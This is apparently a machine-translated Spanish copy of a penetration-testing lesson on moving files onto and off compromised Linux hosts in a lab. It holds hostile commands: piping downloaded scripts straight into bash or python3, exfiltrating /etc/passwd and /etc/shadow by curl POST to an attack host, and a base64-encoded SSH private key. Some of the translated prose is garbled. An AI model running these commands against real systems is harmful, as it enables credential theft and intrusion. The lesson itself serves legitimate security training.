# Métodos de transferencia de archivos de Linux

Linux es un sistema operativo versátil, que comúnmente tiene muchas herramientas diferentes que podemos usar para realizar transferencias de archivos. Comprender los métodos de transferencia de archivos en Linux puede ayudar a los atacantes y defensores a mejorar sus habilidades para atacar las redes y prevenir ataques sofisticados.

Hace unos años, nos contactó para realizar una respuesta de incidentes en algunos servidores web. Encontramos múltiples actores de amenaza en seis de los nueve servidores web que investigamos. El actor de amenaza encontró una vulnerabilidad de inyección SQL. Usaron un script bash que, cuando se ejecutó, intentaron descargar otra pieza de malware que se conectó al servidor de comando y control del actor de amenaza.

El script bash que utilizaron probaron tres métodos de descarga para obtener la otra pieza de malware que se conectó al comando y al servidor de control. Su primer intento fue usar`cURL`. Si eso falló, intentó usar`wget`, y si eso falló, usó`Python`. Los tres métodos usan`HTTP`para comunicarse.

Aunque Linux puede comunicarse a través de FTP, SMB le gusta Windows, la mayoría de los sistemas operativos usan la mayoría de los sistemas operativos.`HTTP`y`HTTPS`para la comunicación.

Esta sección revisará múltiples formas de transferir archivos en Linux, incluidos HTTP, BASH, SSH, etc.

---

# **Descargar operaciones**

Tenemos acceso a la máquina`NIX04`, y necesitamos descargar un archivo de nuestro`Pwnbox`máquina. Veamos cómo podemos lograr esto utilizando múltiples métodos de descarga de archivos.

![](https://academy.hackthebox.com/storage/modules/24/LinuxDownloadUpload.drawio.png)

# **Base64 codificación / decodificación**

Dependiendo del tamaño del archivo que deseamos transferir, podemos usar un método que no requiere comunicación de red. Si tenemos acceso a un terminal, podemos codificar un archivo a una cadena Base64, copiar su contenido en el terminal y realizar la operación inversa. Veamos cómo podemos hacer esto con Bash.

### **Pwnbox - Verifique el archivo MD5 Hash**

```
xnoxos@htb[/htb]$ md5sum id_rsa4e301756a07ded0a2dd6953abf015278  id_rsa

```

Usamos`cat`Para imprimir el contenido del archivo, y base64 codifica la salida usando una tubería`|`. Usamos la opción`-w 0`para crear solo una línea y terminó con el comando con un semi-colon (;) y`echo`Palabra clave para iniciar una nueva línea y facilitar la copia.

### **Pwnbox - Codificar la tecla SSH a Base64**

```
xnoxos@htb[/htb]$ cat id_rsa |base64 -w 0;echoLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=

```

Copiamos este contenido, lo pegamos en nuestra máquina de destino Linux y usamos`base64`con la opción `-d 'para decodificarlo.

### **Linux: decodifique el archivo**

```
xnoxos@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

Finalmente, podemos confirmar si el archivo se transfirió correctamente utilizando el`md5sum`dominio.

### **Linux: confirme la coincidencia de hashes MD5**

```
xnoxos@htb[/htb]$ md5sum id_rsa4e301756a07ded0a2dd6953abf015278  id_rsa

```

**Nota:**También puede cargar archivos utilizando la operación inversa. Desde su Target Cat y Base64 comprometidos, codifican un archivo y lo decodifiquen en su Pwnbox.

# **Descargas web con wget y curl**

Dos de las utilidades más comunes en las distribuciones de Linux para interactuar con aplicaciones web son`wget`y`curl`. Estas herramientas se instalan en muchas distribuciones de Linux.

Para descargar un archivo usando`wget`, necesitamos especificar la URL y la opción `-o 'para establecer el nombre de archivo de salida.

### **Descargue un archivo usando wget**

```
xnoxos@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

`cURL`es muy similar a`wget`, pero la opción de nombre de archivo de salida es en minúsculas `` -o '.

### **Descargue un archivo usando curl**

```
xnoxos@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

---

# **Ataques sin archivo usando Linux**

Por la forma en que funciona Linux y cómo[Las tuberías operan](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), la mayoría de las herramientas que usamos en Linux se pueden usar para replicar las operaciones sin archivo, lo que significa que no tenemos que descargar un archivo para ejecutarlo.

**Nota:**Algunas cargas útiles como`mkfifo`Escriba archivos en el disco. Tenga en cuenta que, si bien la ejecución de la carga útil puede no estar filmada cuando usa una tubería, dependiendo de la carga útil elegida, puede crear archivos temporales en el sistema operativo.

Tomemos el`cURL`Comando que usamos, y en lugar de descargar Linenum.Sh, ejecutémoslo directamente usando una tubería.

### **Descarga sin archivo con curl**

```
xnoxos@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Del mismo modo, podemos descargar un archivo de script de Python desde un servidor web y encajarlo en el binario de Python. Hagamos eso, esta vez usando`wget`.

### **Descarga sin archivo con wget**

```
xnoxos@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3Hello World!

```

---

# **Descargar con Bash (/dev/tcp)**

También puede haber situaciones en las que no hay ninguna de las herramientas de transferencia de archivos bien conocidas disponibles. Mientras BASH Versión 2.04 o más esté instalado (compilado con --enable-net-redirections), el archivo de dispositivo incorporado /dev /tcp se puede usar para descargas simples de archivos.

### **Conectarse al servidor web de destino**

```
xnoxos@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80

```

### **Http get solicitud**

```
xnoxos@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

### **Imprima la respuesta**

```
xnoxos@htb[/htb]$ cat <&3

```

---

# **Descargas SSH**

SSH (o Secure Shell) es un protocolo que permite el acceso seguro a computadoras remotas. La implementación de SSH viene con un`SCP`Utilidad para transferencia de archivos remotos que, por defecto, usa el protocolo SSH.

`SCP`(Copia segura) es una utilidad de línea de comandos que le permite copiar archivos y directorios entre dos hosts de forma segura. Podemos copiar nuestros archivos de servidores locales a remotos y de servidores remotos a nuestra máquina local.

`SCP`es muy similar a`copy`o`cp`, pero en lugar de proporcionar una ruta local, necesitamos especificar un nombre de usuario, la dirección IP remota o el nombre DNS y las credenciales del usuario.

Antes de comenzar a descargar archivos de nuestra máquina Linux de destino a nuestro Pwnbox, configuremos un servidor SSH en nuestro Pwnbox.

### **Habilitar el servidor SSH**

```
xnoxos@htb[/htb]$ sudo systemctl enable sshSynchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value$service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...

```

### **Iniciar el servidor SSH**

```
xnoxos@htb[/htb]$ sudo systemctl start ssh
```

### **Comprobando el puerto de escucha SSH**

```
xnoxos@htb[/htb]$ netstat -lnpt(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -

```

Ahora podemos comenzar a transferir archivos. Necesitamos especificar la dirección IP de nuestro Pwnbox y el nombre de usuario y la contraseña.

### **Linux: descarga de archivos usando SCP**

```
xnoxos@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt .
```

**Nota:**Puede crear una cuenta de usuario temporal para transferencias de archivos y evitar usar sus credenciales o claves principales en una computadora remota.

---

# **Operaciones de carga**

También hay situaciones como la explotación binaria y el análisis de captura de paquetes, donde debemos cargar archivos de nuestra máquina de destino en nuestro host de ataque. Los métodos que utilizamos para las descargas también funcionarán para cargas. Veamos cómo podemos cargar archivos de varias maneras.

---

# **Subida web**

Como se menciona en el`Windows File Transfer Methods`sección, podemos usar[SuboadServer](https://github.com/Densaugeo/uploadserver), un módulo extendido de la pitón`HTTP.Server`Módulo, que incluye una página de carga de archivos. Para este ejemplo de Linux, veamos cómo podemos configurar el`uploadserver`Módulo para usar`HTTPS`para comunicación segura.

Lo primero que debemos hacer es instalar el `uploadserver`módulo.

### **Pwnbox - Iniciar servidor web**

```
xnoxos@htb[/htb]$ sudo python3 -m pip install --user uploadserverCollecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1

```

Ahora necesitamos crear un certificado. En este ejemplo, estamos utilizando un certificado autofirmado.

### **Pwnbox: cree un certificado autofirmado**

```
xnoxos@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----

```

El servidor web no debe alojar el certificado. Recomendamos crear un nuevo directorio para alojar el archivo para nuestro servidor web.

### **Pwnbox - Iniciar servidor web**

```
xnoxos@htb[/htb]$ mkdir https && cd https
```

```
xnoxos@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pemFile upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...

```

Ahora desde nuestra máquina comprometida, subamos el`/etc/passwd`y`/etc/shadow`archivos.

### **Linux: cargue varios archivos**

```
xnoxos@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Usamos la opción`--insecure`Porque utilizamos un certificado autofirmado en el que confiamos.

---

# **Método alternativo de transferencia de archivos web**

Dado que las distribuciones de Linux generalmente tienen`Python`o`php`Instalado, iniciar un servidor web para transferir archivos es sencillo. Además, si el servidor que comprometemos es un servidor web, podemos mover los archivos que queremos transferir al directorio del servidor web y acceder a ellos desde la página web, lo que significa que estamos descargando el archivo de nuestro Pwnbox.

Es posible defender un servidor web utilizando varios idiomas. Una máquina Linux comprometida puede no tener un servidor web instalado. En tales casos, podemos usar un mini servidor web. Lo que quizás les falte en seguridad, compensan la flexibilidad, ya que la ubicación de Webroot y los puertos de escucha se pueden cambiar rápidamente.

### **Linux: creando un servidor web con python3**

```
xnoxos@htb[/htb]$ python3 -m http.serverServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

### **Linux: creando un servidor web con python2.7**

```
xnoxos@htb[/htb]$ python2.7 -m SimpleHTTPServerServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

### **Linux: crear un servidor web con PHP**

```
xnoxos@htb[/htb]$ php -S 0.0.0.0:8000[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started

```

### **Linux: crear un servidor web con Ruby**

```
xnoxos@htb[/htb]$ ruby -run -ehttpd . -p8000[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

### **Descargue el archivo desde la máquina de destino en el Pwnbox**

```
xnoxos@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/plain]
Saving to: 'filetotransfer.txt'

filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s

2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]

```

**Nota:**Cuando iniciamos un nuevo servidor web usando Python o PHP, es importante considerar que el tráfico entrante puede ser bloqueado. Estamos transfiriendo un archivo de nuestro objetivo a nuestro host de ataque, pero no estamos cargando el archivo.

---

# **SCP SUPTOW**

Podemos encontrar algunas empresas que permitan el`SSH protocol`(TCP/22) para conexiones salientes, y si ese es el caso, podemos usar un servidor SSH con el`scp`utilidad para cargar archivos. Intentemos cargar un archivo en la máquina de destino utilizando el protocolo SSH.

### **Carga de archivo usando SCP**

```
xnoxos@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/htb-student@10.129.86.90's password:
passwd                                                                                                           100% 3414     6.7MB/s   00:00

```

**Nota:**Recuerde que la sintaxis SCP es similar a CP o copia.

---

# **Adelante**

Estos son los métodos de transferencia de archivos más comunes que utilizan herramientas incorporadas en los sistemas Linux, pero hay más. En las siguientes secciones, discutiremos otros mecanismos y herramientas que podemos usar para realizar operaciones de transferencia de archivos.